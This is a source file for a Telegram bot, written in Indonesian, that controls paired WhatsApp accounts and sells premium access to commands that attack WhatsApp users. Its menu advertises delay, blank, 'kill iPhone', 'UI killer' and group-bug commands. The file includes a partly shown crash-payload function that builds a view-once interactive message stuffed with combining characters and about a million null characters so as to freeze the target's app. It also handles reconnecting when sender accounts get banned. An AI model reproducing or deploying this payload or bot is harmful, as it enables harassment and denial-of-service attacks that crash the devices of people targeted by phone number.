// =============================================
//   BOT TELEGRAM + WHATSAPP SENDER
//   Compatible : Pterodactyl Node.js Egg
//   Library WA : @whiskeysockets/baileys
//   Pairing Code: QUANTUMT (8 huruf)
// =============================================

const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const fs     = require("fs");
const path   = require("path");
const pino   = require("pino");
const crypto = require("crypto");

// =============================================
//   KONFIGURASI — WAJIB DIISI
// =============================================
const TOKEN    = "Token"; // ← Token Telegram Bot kamu
const OWNER_ID = 7532396111; // ← Ganti dengan Telegram ID kamu (gunakan /myid)

// =============================================
//   TEMPLATE PESAN WA — EDIT SESUKAMU
// =============================================
const TEMPLATE_XDELAY  = `Ampas ya?😈`;
const TEMPLATE_XVORTEX = `Ampas ya?😈`;

// =============================================
//   KONFIGURASI DELAY (QuantumDelay)
// =============================================
const XDELAY_MS = 3000; // ← Delay dalam milidetik (3000 = 3 detik)

// =============================================
//   STORAGE
// =============================================
const SESSION_DIR = "./sessions";
const DATA_FILE   = "./data.json";

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR);

function loadData() {
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ premiumUsers: [], menuPhoto: null }));
  }
  return JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
}
function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

let appData = loadData();

const senders   = {}; // { "628xx": { sock, status } }
const userState = {}; // { chatId: { step } }

// =============================================
//   INIT BOT
// =============================================
const bot = new TelegramBot(TOKEN, { polling: true });

// =============================================
//   HELPERS
// =============================================
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

function escapeHtml(text) {
  return String(text).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}

function getCurrentDate() {
  return new Date().toLocaleString("id-ID", {
    day:"2-digit", month:"2-digit", year:"numeric",
    hour:"2-digit", minute:"2-digit", second:"2-digit",
  });
}

function formatJID(num) {
  num = num.replace(/\D/g, "");
  if (num.startsWith("0")) num = "62" + num.slice(1);
  return num + "@s.whatsapp.net";
}

// =============================================
//   DATABASE KODE NEGARA (multi-region)
// =============================================
const COUNTRY_CODES = [
  { code: "7",   countries: [{ name: "🇷🇺 Russia / Kazakhstan", dial: "7" }] },
  { code: "20",  countries: [{ name: "🇪🇬 Egypt", dial: "20" }] },
  { code: "27",  countries: [{ name: "🇿🇦 South Africa", dial: "27" }] },
  { code: "30",  countries: [{ name: "🇬🇷 Greece", dial: "30" }] },
  { code: "31",  countries: [{ name: "🇳🇱 Netherlands", dial: "31" }] },
  { code: "32",  countries: [{ name: "🇧🇪 Belgium", dial: "32" }] },
  { code: "33",  countries: [{ name: "🇫🇷 France", dial: "33" }] },
  { code: "34",  countries: [{ name: "🇪🇸 Spain", dial: "34" }] },
  { code: "36",  countries: [{ name: "🇭🇺 Hungary", dial: "36" }] },
  { code: "39",  countries: [{ name: "🇮🇹 Italy", dial: "39" }] },
  { code: "40",  countries: [{ name: "🇷🇴 Romania", dial: "40" }] },
  { code: "41",  countries: [{ name: "🇨🇭 Switzerland", dial: "41" }] },
  { code: "43",  countries: [{ name: "🇦🇹 Austria", dial: "43" }] },
  { code: "44",  countries: [{ name: "🇬🇧 United Kingdom", dial: "44" }] },
  { code: "45",  countries: [{ name: "🇩🇰 Denmark", dial: "45" }] },
  { code: "46",  countries: [{ name: "🇸🇪 Sweden", dial: "46" }] },
  { code: "47",  countries: [{ name: "🇳🇴 Norway", dial: "47" }] },
  { code: "48",  countries: [{ name: "🇵🇱 Poland", dial: "48" }] },
  { code: "49",  countries: [{ name: "🇩🇪 Germany", dial: "49" }] },
  { code: "51",  countries: [{ name: "🇵🇪 Peru", dial: "51" }] },
  { code: "52",  countries: [{ name: "🇲🇽 Mexico", dial: "52" }] },
  { code: "53",  countries: [{ name: "🇨🇺 Cuba", dial: "53" }] },
  { code: "54",  countries: [{ name: "🇦🇷 Argentina", dial: "54" }] },
  { code: "55",  countries: [{ name: "🇧🇷 Brazil", dial: "55" }] },
  { code: "56",  countries: [{ name: "🇨🇱 Chile", dial: "56" }] },
  { code: "57",  countries: [{ name: "🇨🇴 Colombia", dial: "57" }] },
  { code: "58",  countries: [{ name: "🇻🇪 Venezuela", dial: "58" }] },
  { code: "60",  countries: [{ name: "🇲🇾 Malaysia", dial: "60" }] },
  { code: "61",  countries: [{ name: "🇦🇺 Australia", dial: "61" }] },
  { code: "62",  countries: [{ name: "🇮🇩 Indonesia", dial: "62" }] },
  { code: "63",  countries: [{ name: "🇵🇭 Philippines", dial: "63" }] },
  { code: "64",  countries: [{ name: "🇳🇿 New Zealand", dial: "64" }] },
  { code: "65",  countries: [{ name: "🇸🇬 Singapore", dial: "65" }] },
  { code: "66",  countries: [{ name: "🇹🇭 Thailand", dial: "66" }] },
  { code: "81",  countries: [{ name: "🇯🇵 Japan", dial: "81" }] },
  { code: "82",  countries: [{ name: "🇰🇷 South Korea", dial: "82" }] },
  { code: "84",  countries: [{ name: "🇻🇳 Vietnam", dial: "84" }] },
  { code: "86",  countries: [{ name: "🇨🇳 China", dial: "86" }] },
  { code: "90",  countries: [{ name: "🇹🇷 Turkey", dial: "90" }] },
  { code: "91",  countries: [{ name: "🇮🇳 India", dial: "91" }] },
  { code: "92",  countries: [{ name: "🇵🇰 Pakistan", dial: "92" }] },
  { code: "93",  countries: [{ name: "🇦🇫 Afghanistan", dial: "93" }] },
  { code: "94",  countries: [{ name: "🇱🇰 Sri Lanka", dial: "94" }] },
  { code: "95",  countries: [{ name: "🇲🇲 Myanmar", dial: "95" }] },
  { code: "98",  countries: [{ name: "🇮🇷 Iran", dial: "98" }] },
  { code: "212", countries: [{ name: "🇲🇦 Morocco", dial: "212" }, { name: "🇪🇭 Western Sahara", dial: "2125288" }] },
  { code: "966", countries: [{ name: "🇸🇦 Saudi Arabia", dial: "966" }] },
  { code: "971", countries: [{ name: "🇦🇪 UAE", dial: "971" }] },
  { code: "972", countries: [{ name: "🇮🇱 Israel", dial: "972" }] },
  { code: "880", countries: [{ name: "🇧🇩 Bangladesh", dial: "880" }] },
  { code: "234", countries: [{ name: "🇳🇬 Nigeria", dial: "234" }] },
  { code: "254", countries: [{ name: "🇰🇪 Kenya", dial: "254" }] },
  { code: "255", countries: [{ name: "🇹🇿 Tanzania", dial: "255" }] },
  { code: "256", countries: [{ name: "🇺🇬 Uganda", dial: "256" }] },
  { code: "233", countries: [{ name: "🇬🇭 Ghana", dial: "233" }] },
  // Prefix shared (perlu pilih negara)
  {
    code: "1",
    countries: [
      { name: "🇺🇸 United States",       dial: "1" },
      { name: "🇨🇦 Canada",               dial: "1" },
      { name: "🇧🇸 Bahamas",              dial: "1242" },
      { name: "🇧🇧 Barbados",             dial: "1246" },
      { name: "🇦🇮 Anguilla",             dial: "1264" },
      { name: "🇦🇬 Antigua & Barbuda",    dial: "1268" },
      { name: "🇻🇬 British Virgin Islands",dial: "1284" },
      { name: "🇻🇮 US Virgin Islands",    dial: "1340" },
      { name: "🇰🇾 Cayman Islands",       dial: "1345" },
      { name: "🇧🇲 Bermuda",              dial: "1441" },
      { name: "🇬🇩 Grenada",              dial: "1473" },
      { name: "🇹🇨 Turks & Caicos",       dial: "1649" },
      { name: "🇲🇸 Montserrat",           dial: "1664" },
      { name: "🇸🇽 Sint Maarten",         dial: "1721" },
      { name: "🇱🇨 Saint Lucia",          dial: "1758" },
      { name: "🇩🇲 Dominica",             dial: "1767" },
      { name: "🇻🇨 St. Vincent",          dial: "1784" },
      { name: "🇵🇷 Puerto Rico",          dial: "1787" },
      { name: "🇩🇴 Dominican Republic",   dial: "1809" },
      { name: "🇹🇹 Trinidad & Tobago",    dial: "1868" },
      { name: "🇰🇳 Saint Kitts & Nevis",  dial: "1869" },
      { name: "🇯🇲 Jamaica",              dial: "1876" },
    ],
  },
];

// Deteksi prefix negara dari nomor
function detectCountries(rawNum) {
  const num = rawNum.replace(/\D/g, "");
  for (let len = 4; len >= 1; len--) {
    const prefix = num.slice(0, len);
    const found  = COUNTRY_CODES.find(c => c.code === prefix);
    if (found) return { prefix, entry: found };
  }
  return null;
}

function isValidNumber(num) {
  num = num.replace(/\D/g, "");
  return num.length >= 7 && num.length <= 15 && detectCountries(num) !== null;
}

function getActiveSender() {
  for (const [num, data] of Object.entries(senders)) {
    if (data.status === "connected") return num;
  }
  return null;
}

function isOwner(userId)   { return userId === OWNER_ID; }
function isPremium(userId) { return isOwner(userId) || appData.premiumUsers.includes(userId); }

async function denyAccess(chatId) {
  await bot.sendMessage(
    chatId,
    `🚫 *Lu Siapa Ngentod?*\n\nFitur ini hanya untuk *Premium User* atau *Owner*.\nHubungi owner untuk membeli Premium.`,
    { parse_mode: "Markdown" }
  );
}

// =============================================
//   KEYBOARD
// =============================================
function cancelKeyboard() {
  return {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: [[{ text: "❌ Batalkan Add Sender", callback_data: "cancel_addsender" }]] },
  };
}

function backMenuKeyboard() {
  return {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: [[{ text: "ғᴏʀᴄx ᴍᴇɴᴜ", callback_data: "back_menu" }]] },
  };
}

// =============================================
//   TEKS MENU PAGE 1 — Info Bot
// =============================================
function getMenuPage1Text() {
  const now    = new Date();
  const days   = ["Minggu","Senin","Selasa","Rabu","Kamis","Jumat","Sabtu"];
  const months = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
  const dateStr = `${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}, ${days[now.getDay()]}`;

  return (
    `ғᴏʀᴄx-ᴇʟɪᴛᴇ ᴏɴᴇ ᴛᴀᴘ ᴏɴᴇ ᴅᴇᴀᴛʜ ᴇᴠᴇʀʏᴛʜɪɴɢ\n` +
    `ɴᴇᴡ sᴋɪʟʟ, ɴᴇᴡ ᴘᴇʀғᴏʀᴍᴀ. ᴠ𝟷 ɢᴇɴᴢ 𝟷 ʙᴇᴛᴀ.\n\n` +
    `𝘔𝘦𝘵𝘢𝘥𝘢𝘵𝘢 𝘐𝘯𝘵𝘦𝘭𝘭𝘪𝘨𝘦𝘯𝘤𝘦\n` +
    `\`\`\`\n` +
    `𝘤𝘰𝘯𝘴𝘵 𝘝𝘌𝘙𝘚𝘐𝘖𝘕   = "ᴠ𝟷 ɢᴇɴᴢ 𝟷";\n` +
    `𝘤𝘰𝘯𝘴𝘵 𝘋𝘌𝘝𝘌𝘓𝘖𝘗𝘌𝘙 = "@nazeajaa (𝘕𝘢𝘻𝘦)";\n` +
    `𝘤𝘰𝘯𝘴𝘵 𝘓𝘢𝘯𝘨𝘶𝘢𝘨𝘦  = "𝘑𝘢𝘷𝘢𝘚𝘤𝘳𝘪𝘱𝘵";\n` +
    `𝘤𝘰𝘯𝘴𝘵 𝘔𝘰𝘥𝘦      = "𝘗𝘶𝘣𝘭𝘪𝘤";\n` +
    `𝘤𝘰𝘯𝘴𝘵 𝘋𝘢𝘵𝘦      = "${dateStr}";\n` +
    `\`\`\``
  );
}

// =============================================
//   TEKS MENU PAGE 2 — Daftar Func/Cmd
// =============================================
function getMenuPage2Text() {
  return (
    `sɪᴍᴘʟᴇ ᴘʀᴏᴊᴇᴄᴛ, ᴏɴᴇ ᴛᴀᴘ ᴏɴᴇ ᴅᴇᴀᴛʜ ᴇᴠᴇʀʏᴛʜɪɴɢ\n` +
    `sɪᴍᴘʟᴇ ᴋɪʟʟɪɴɢ, ᴏɴᴇ ᴛᴀᴘ ᴏɴᴇ ᴅᴇᴀᴛʜ ᴡʜᴀᴛsᴀᴘᴘ ᴄᴀɴᴄᴇʀ\n\n` +
    `*sᴇɴᴅᴇʀ :                  *\n` +
    `/addsender (numbers)                  \n` +
    `/listsender                  \n\n` +
    `*🩸ғᴏʀᴄx - ᴇʟɪᴛᴇ ᴠ𝟷 - ᴏɴᴇ ᴛᴀᴘ ᴏɴᴇ ᴅᴇᴀᴛʜ             *\n` +
    `/ғᴏʀᴄx (numbers) - sɪᴍᴘʟᴇ ᴅᴇʟᴀʏ                  \n` +
    `/ᴘʜᴀɴᴛᴏᴍ (numbers) - sɪᴍᴘʟᴇ ʙʟᴀɴᴋ                  \n` +
    `/ʜɪᴛᴀᴍ (numbers) - sɪᴍᴘʟᴇ ʙʟᴀɴᴋ                  \n` +
    `/ᴄʀᴀᴢʏ (numbers) - sɪᴍᴘʟᴇ ᴄʀᴀᴢʏ                  \n` +
    `/ɪᴘ (numbers) - sɪᴍᴘʟᴇ ᴋɪʟʟ ɪᴘʜᴏɴᴇ                  \n` +
    `/ᴜɪᴋɪʟʟᴇʀ (numbers) - sɪᴍᴘʟᴇ ᴜɪ ᴋɪʟʟᴇʀ\n` +
    `/ʙᴜɢɢʀᴏᴜᴘ (link) - sɪᴍᴘʟᴇ ɢʀᴏᴜᴘ ʙᴜɢ                  \n\n` +
    `*👑 𝘍𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 𝘜𝘴𝘦!*                  \n` +
    `/ᴀᴅᴅᴘʀᴇᴍ (id)                  \n` +
    `/ᴅᴇʟᴘʀᴇᴍ (id)                  \n` +
    `/ʟɪsᴛᴘʀᴇᴍ                  \n` +
    `/sᴇᴛᴍᴇɴᴜ                  \n` +
    `/ᴘɪɴɢ                  \n\n` +
    `*ᴄᴇᴋ ɪᴅ ᴛᴏᴏʟs ↓*                  \n` +
    `/ɪɴғᴏ`
  );
}

// =============================================
//   KEYBOARD PAGE 1
// =============================================
function menuPage1Keyboard() {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "ғᴏʀᴄx", callback_data: "menu_page2" },
        ],
        [
          { text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ", url: "https://t.me/nazeajaa" },
        ],
      ],
    },
  };
}

// =============================================
//   KEYBOARD PAGE 2
// =============================================
function menuPage2Keyboard() {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "ғᴏʀᴄx", callback_data: "menu_page1" },
        ],
        [
          { text: "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ", url: "https://t.me/nazeajaa" },
        ],
      ],
    },
  };
}

// =============================================
//   KIRIM MENU PAGE 1
// =============================================
// =============================================
//   ANIMASI LOADING MENU
// =============================================
const LOADING_FRAMES = [
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[|||                  ]𝟷𝟶%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[|||||               ]𝟸𝟻%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[||||||||            ]𝟺𝟶%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[||||||||||          ]𝟻𝟶%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[||||||||||||        ]𝟼𝟶%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[||||||||||||||      ]𝟽𝟻%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[||||||||||||||||    ]𝟾𝟻%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[||||||||||||||||||  ]𝟿𝟻%`",
  "ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n`[||||||||||||||||||||]𝟷𝟶𝟶%`",
];

async function showLoadingThenEdit(chatId, messageId, isCaption, finalText, finalOpts) {
  for (let i = 0; i < LOADING_FRAMES.length; i++) {
    try {
      if (isCaption) {
        await bot.editMessageCaption(LOADING_FRAMES[i], { chat_id: chatId, message_id: messageId, parse_mode: "Markdown" });
      } else {
        await bot.editMessageText(LOADING_FRAMES[i], { chat_id: chatId, message_id: messageId, parse_mode: "Markdown" });
      }
    } catch (_) {}
    await sleep(100);
  }
  try {
    if (isCaption) {
      await bot.editMessageCaption(finalText, { chat_id: chatId, message_id: messageId, ...finalOpts });
    } else {
      await bot.editMessageText(finalText, { chat_id: chatId, message_id: messageId, ...finalOpts });
    }
  } catch (_) {}
}

async function sendMainMenu(chatId, fromUser) {
  const text    = getMenuPage1Text();
  const photoId = appData.menuPhoto;

  // Kirim loading dulu
  let sentMsg;
  if (photoId) {
    sentMsg = await bot.sendPhoto(chatId, photoId, {
      caption   : `ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n\`[|||                  ]𝟷𝟶%\``,
      parse_mode: "Markdown",
    });
  } else {
    sentMsg = await bot.sendMessage(chatId, `ғᴏʀᴄx ᴇʟɪᴛᴇ ʟᴏᴀᴅɪɴɢ\n\n\`[|||                  ]𝟷𝟶%\``, { parse_mode: "Markdown" });
  }

  await showLoadingThenEdit(
    chatId,
    sentMsg.message_id,
    !!photoId,
    text,
    { parse_mode: "Markdown", ...menuPage1Keyboard() }
  );
}

// =============================================
//   CONNECT SENDER VIA PAIRING CODE
// =============================================
async function connectSender(chatId, senderNumber) {
  const sessionPath = path.join(SESSION_DIR, senderNumber);
  if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version }          = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
  });

  senders[senderNumber] = { sock, status: "connecting" };
  let pairingRequested  = false;

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (!pairingRequested && !sock.authState.creds.registered) {
      pairingRequested = true;
      await sleep(2000);
      try {
        const code      = await sock.requestPairingCode(senderNumber, "NICENAZE");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;
        await bot.sendMessage(
          chatId,
          `🔑 *Pairing Code untuk ${senderNumber}:*\n\n` +
          `┌─────────────────────┐\n` +
          `│      \`${formatted}\`      │\n` +
          `└─────────────────────┘\n\n` +
          `📱 *Cara pakai:*\n` +
          `1. Buka WhatsApp di HP\n` +
          `2. Ketuk ⋮ → *Perangkat Tertaut*\n` +
          `3. Ketuk *Tautkan Perangkat*\n` +
          `4. Pilih *Tautkan dengan Nomor Telepon*\n` +
          `5. Masukkan kode di atas\n\n` +
          `⏳ _Kode berlaku beberapa menit_`,
          { parse_mode: "Markdown" }
        );
      } catch (err) {
        await bot.sendMessage(chatId, `❌ *Gagal generate pairing code!*\nError: \`${err.message}\``, backMenuKeyboard());
      }
    }

    if (connection === "open") {
      senders[senderNumber].status      = "connected";
      senders[senderNumber].retryCount  = 0; // Reset retry counter
      await bot.sendMessage(chatId, `✅ *Sender ${senderNumber} berhasil terhubung!*`, backMenuKeyboard());
    }

    if (connection === "close") {
      const boomErr    = new Boom(lastDisconnect?.error);
      const statusCode = boomErr?.output?.statusCode;
      senders[senderNumber].status = "disconnected";

      // Status code yang berarti BANNED / PERMANEN — jangan reconnect
      const permanentCodes = [
        DisconnectReason.loggedOut,  // 401
        DisconnectReason.forbidden,  // 403
        405, // banned
        401,
        403,
      ];

      if (permanentCodes.includes(statusCode)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        delete senders[senderNumber];

        const reason = statusCode === 401 || statusCode === DisconnectReason.loggedOut
          ? "Logout / Session habis"
          : statusCode === 403 || statusCode === DisconnectReason.forbidden
          ? "⛔ Akun kemungkinan di-banned WhatsApp"
          : "Koneksi ditolak permanen";

        await bot.sendMessage(chatId,
          `🚫 *Sender ${senderNumber} dihentikan.*\n` +
          `Alasan: *${reason}*\n\n` +
          `Sesi telah dihapus. Silakan tambah sender baru via /addsender`,
          backMenuKeyboard()
        );
        return; // Stop, jangan reconnect
      }

      // Cek retry limit (max 3x reconnect)
      const retryCount = (senders[senderNumber]?.retryCount || 0) + 1;
      if (senders[senderNumber]) senders[senderNumber].retryCount = retryCount;

      if (retryCount > 3) {
        delete senders[senderNumber];
        await bot.sendMessage(chatId,
          `❌ *Sender ${senderNumber} gagal reconnect setelah 3x percobaan.*\n` +
          `Silakan tambah ulang via /addsender`,
          backMenuKeyboard()
        );
        return;
      }

      // Reconnect dengan delay bertahap
      const delay = retryCount * 5000; // 5s, 10s, 15s
      await bot.sendMessage(chatId,
        `🔄 *Sender ${senderNumber} terputus.*\nPercobaan ke-${retryCount}/3, reconnect dalam ${delay / 1000} detik...`,
        { parse_mode: "Markdown" }
      );
      setTimeout(() => connectSender(chatId, senderNumber), delay);
    }
  });

  sock.ev.on("creds.update", saveCreds);
}

// =============================================
//   KIRIM PESAN WA
// =============================================
async function sendWA(senderNumber, targetNumber, message) {
  if (!senders[senderNumber] || senders[senderNumber].status !== "connected") {
    throw new Error(`Sender ${senderNumber} tidak terhubung.`);
  }
  await senders[senderNumber].sock.sendMessage(formatJID(targetNumber), { text: message });
}

// =============================================
//   HELPER RUN WITH SENDER
// =============================================
async function runWithSender(chatId, fn) {
  const sender = getActiveSender();
  if (!sender) {
    return bot.sendMessage(chatId, "⚠️ *Tidak ada sender aktif!*\nSilakan tambah sender dulu via /addsender 628xx", { parse_mode: "Markdown" });
  }
  try {
    await fn(sender);
  } catch (err) {
    await bot.sendMessage(chatId, `❌ *Gagal!*\nError: \`${err.message}\``, backMenuKeyboard());
  }
}

// ╔══════════════════════════════════════════════╗
// ║    LETAKAN FUNC BUATAN KAMU DI DALAM SINI   ║
// ║                                              ║
// ║  Parameter tersedia di setiap func:          ║
// ║  - chatId       : ID chat Telegram user      ║
// ║  - targetNumber : Nomor WA tujuan (628xx)    ║
// ║  - senderNumber : Nomor WA pengirim (628xx)  ║
// ║                                              ║
// ║  Helper yang bisa langsung dipakai:          ║
// ║  - sendWA(senderNumber, target, "pesan")     ║
// ║  - sleep(ms)  → delay/tunggu                 ║
// ║  - bot.sendMessage(chatId, "teks", opts)     ║
// ╚══════════════════════════════════════════════╝

// ┌──────────────────────────────────────────────┐
// │  FUNC QUANTUMDELAY — delayhard               │
// └──────────────────────────────────────────────┘
async function forcx(sock, target) {
  try {
    let delay1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "ANGELESb҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ANGELESཀ‌‌\\>🍷𞋯",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "call_permission_message",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    let delay2 = {
      extendedTextMessage: {
